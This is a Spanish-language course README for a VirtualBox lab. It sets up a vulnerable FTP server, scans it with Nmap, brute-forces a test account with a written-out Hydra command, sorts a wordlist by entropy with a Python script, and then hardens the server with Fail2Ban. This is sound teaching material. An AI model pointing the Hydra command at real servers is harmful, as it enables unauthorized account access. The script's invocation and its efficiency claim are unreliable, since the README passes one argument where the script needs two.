# Diccionarios, Escaneo e Hydra sobre FTP

## 📋 Descripción

Este repositorio contiene la documentación y los scripts utilizados en la práctica RA1-5.AEE para configurar y simular un ataque de fuerza bruta controlado contra un servicio FTP que utiliza autenticación en texto claro.

El objetivo es que el alumnado diseñe, implemente y documente un entorno didáctico para experimentar con:
1.  Riesgos asociados a protocolos de autenticación en texto claro (**FTP**).
2.  Técnicas básicas de reconocimiento (**Nmap**).
3.  Ataques de fuerza bruta (**Hydra**) usando diccionarios optimizados (ordenados por entropía).

## 🛠️ Entorno y Herramientas Utilizadas

* **Plataforma de Despliegue:** VirtualBox
* **Máquina Víctima:** OSBoxes con servicio `vsftpd`
* **Máquina Atacante:** Kali Linux (para herramientas como `Hydra` y `Nmap`)
* **Herramientas Clave:**
    * `vsftpd`: Servidor FTP.
    * `Hydra`: Herramienta de fuerza bruta.
    * `Nmap`: Escáner de puertos.
    * `Python3`: Para el script de ordenación por entropía.
    * `Fail2Ban`: Para el endurecimiento final de la máquina víctima.

## 📝 Guía Paso a Paso (Comandos Ejecutados)

A continuación, se listan los comandos clave ejecutados en la máquina víctima y atacante para configurar el entorno y realizar el ataque.

### A. Configuración de la Máquina Víctima (Servicio FTP)

| Comando | Descripción |
| :--- | :--- |
| `sudo apt install vsftpd -y` | Instala el servidor FTP en texto claro. |
| `sudo systemctl restart vsftpd` | Reinicia el servicio `vsftpd`. |
| `sudo systemctl enable vsftpd` | Asegura que el servicio se inicie automáticamente. |
| `sudo adduser ftpuser` | Crea el usuario objetivo del ataque (contraseña: `ftp12345`). |
| `sudo ufw allow 21/tcp` | Abre el puerto 21 para permitir conexiones FTP. |

### B. Configuración de la Máquina Atacante (Herramientas y Diccionarios)

| Comando | Descripción |
| :--- | :--- |
| `sudo apt update` | Actualiza la lista de paquetes. |
| `sudo apt install hydra nmap git python3 python3-pip -y` | Instala las herramientas necesarias (`Hydra`, `Nmap`, `Git`, `Python3`). |
| `mkdir ~/diccionarios` | Crea un directorio para almacenar los diccionarios. |
| `cd ~/diccionarios` | Navega al nuevo directorio. |
| `git clone https://github.com/danielmiessler/SecLists.git` | Descarga el repositorio de diccionarios SecLists. |
| `git clone https://github.com/berzerk0/Probable-Wordlists.git` | Descarga el repositorio Probable-Wordlists. |
| `python3 ordenar_entropia.py diccionario_top.txt` | Ejecuta el script para ordenar el diccionario por entropía. |

### C. Fase de Reconocimiento y Ataque

| Comando | Descripción |
| :--- | :--- |
| `nmap -p 21 10.0.2.5` | Escanea la máquina víctima para confirmar que el puerto 21 (FTP) está abierto. |
| `hydra -l ftpuser -P diccionario_top.txt ftp://10.0.2.5 -o hydra_found.txt -t 4 -V` | Inicia el ataque de fuerza bruta con Hydra: usuario `ftpuser`, usando el diccionario optimizado, contra la IP `10.0.2.5`. |

### D. Endurecimiento y Limpieza (Post-Ataque)

| Comando | Descripción |
| :--- | :--- |
| `sudo apt install fail2ban -y` | Instala Fail2Ban para proteger contra futuros ataques de fuerza bruta. |
| `sudo systemctl enable fail2ban` | Habilita Fail2Ban para que inicie al arrancar. |
| `sudo systemctl start fail2ban` | Inicia el servicio Fail2Ban. |
| `sudo nano /etc/fail2ban/jail.local` | Edita el archivo de configuración para añadir una IP a la lista blanca (`Ignoreip 10.0.2.15/24`). |
| `sudo ufw delete allow 21/tcp` | **Cierra el puerto 21** para evitar vulnerabilidades permanentes. |
| `sudo userdel -r ftpuser` | **Elimina el usuario de pruebas** para limpieza. |
| `sudo systemctl disable vsftpd` | **Deshabilita el servicio vsftpd** para evitar vulnerabilidades. |

## 🐍 Script de Optimización

El archivo `ordenar_entropia.py` se utiliza para ordenar el diccionario de contraseñas, priorizando aquellas con mayor entropía para optimizar la eficiencia del ataque de fuerza bruta:

```python
import math, sys
import collections

# Función para calcular la entropía (complejidad) de una contraseña
def entropy(s):
    if not s:
        return 0
    # Cuenta la frecuencia de cada carácter en la cadena
    counter = collections.Counter(s)
    length = len(s)
    
    # Calcula la entropía de Shannon (en bits)
    return -sum((count/length) * math.log2(count/length) for count in counter.values()) # cite: 76, 77, 79, 80, 81

# Función principal para procesar los archivos
def main(infile, outfile):
    # Lee el archivo de entrada
    with open(infile, errors='ignore') as f: # cite: 83
        # Crea una lista de contraseñas únicas y sin espacios
        pw = [p.strip() for p in f if p.strip()] # cite: 84
    
    # Ordena la lista de contraseñas por entropía (de mayor a menor)
    sorted_pw = sorted(set(pw), key=lambda x: entropy(x), reverse=True) # cite: 85
    
    # Escribe las contraseñas ordenadas en el archivo de salida
    with open(outfile, 'w') as f: # cite: 86
        f.write('\n'.join(sorted_pw)) # cite: 87

# Punto de entrada del script
if __name__ == "__main__": # cite: 88, 89
    # Requiere el nombre del archivo de entrada y el de salida como argumentos
    main(sys.argv[1], sys.argv[2]) # cite: 90
